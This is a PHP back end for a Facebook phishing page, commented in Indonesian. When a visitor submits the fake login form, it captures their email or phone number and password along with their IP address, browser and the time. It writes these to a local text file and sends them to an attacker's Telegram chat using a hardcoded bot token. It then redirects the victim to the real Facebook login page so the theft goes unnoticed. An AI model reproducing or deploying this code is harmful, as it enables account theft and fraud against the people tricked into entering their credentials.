<?php
// Set zona waktu agar laporan waktu akurat
date_default_timezone_set('Asia/Jakarta');

// FUNGSI UNTUK MENDAPATKAN IP ASLI PENGGUNA
function get_real_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // Jika IP ada banyak (karena proxy bertumpuk), ambil yang pertama
    if (strpos($ip, ',') !== false) {
        $ip = explode(',', $ip)[0];
    }
    return $ip;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Ambil data dari form
    $email = htmlspecialchars($_POST['email']);
    $pass  = htmlspecialchars($_POST['pass']);
    
    // 2. Ambil Informasi Tambahan
    $ip_address = get_real_ip(); // Menggunakan fungsi Real IP
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $waktu      = date('d-m-Y H:i:s');

    // 3. Konfigurasi Bot Telegram (Data Anda)
    $token   = "8390796660:AAEyD5epa_kM4esv_3rJqZjivmDos7tk-c0"; 
    $chat_id = "858535302";

    // 4. Susun Pesan Telegram
    $pesan_telegram  = "<b>🔔 LOGIN ATTEMPT - FACEBOOK</b>\n\n";
    $pesan_telegram .= "<b>📧 Email/Telp:</b> <code>$email</code>\n";
    $pesan_telegram .= "<b>🔑 Kata Sandi:</b> <code>$pass</code>\n\n";
    $pesan_telegram .= "<b>🌐 Informasi Perangkat:</b>\n";
    $pesan_telegram .= "📍 <b>IP Asli:</b> <code>$ip_address</code>\n";
    $pesan_telegram .= "📅 <b>Waktu:</b> $waktu\n";
    $pesan_telegram .= "📱 <b>Browser:</b> " . substr($user_agent, 0, 70) . "...";

    // 5. Simpan Cadangan ke File TXT (Backup)
    $file = fopen("log_data.txt", "a");
    $data_txt = "[$waktu] IP: $ip_address | User: $email | Pass: $pass\n";
    fwrite($file, $data_txt);
    fclose($file);

    // 6. Proses Pengiriman dengan cURL
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id'    => $chat_id,
        'text'       => $pesan_telegram,
        'parse_mode' => 'html'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    curl_close($ch);

    // 7. Redirect ke halaman resmi Facebook
    if ($result) {
        header("Location: https://www.facebook.com/login.php?login_attempt=1");
        exit();
    } else {
        echo "Gagal mengirim data.";
    }
} else {
    header("Location: index.html");
    exit();
}
?>